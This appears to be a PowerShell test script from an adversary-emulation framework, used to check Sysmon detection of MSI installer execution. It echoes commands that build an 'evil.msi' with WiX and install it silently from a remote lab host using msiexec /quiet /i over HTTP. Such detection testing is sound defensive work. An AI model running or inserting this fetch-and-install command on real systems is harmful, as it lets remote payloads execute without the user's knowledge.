# CADRE — WT064 — MSI Installer Execution
. ..\windows\lib\cadre-env.ps1
. ..\windows\lib\common.ps1
print_banner "WT064 - MSI Installer Execution"
start_attack "064" "MSI Installer"
step "Requires WiX toolset (choco install wixtoolset)"
run_cmd "Write-Host 'Build & execute MSI:'"
run_cmd "Write-Host '  candle.exe evil.wxs -o evil.wixobj'"
run_cmd "Write-Host '  light.exe evil.wixobj -out evil.msi'"
run_cmd "Write-Host '  msiexec /quiet /i http://192.168.77.60:8081/evil.msi'"
step "Check WiX availability"
run_cmd "Get-Command candle.exe -ErrorAction SilentlyContinue | Select-Object Source"
result 0 "WT064 — check Sysmon EID 1 (msiexec.exe with remote URL)"
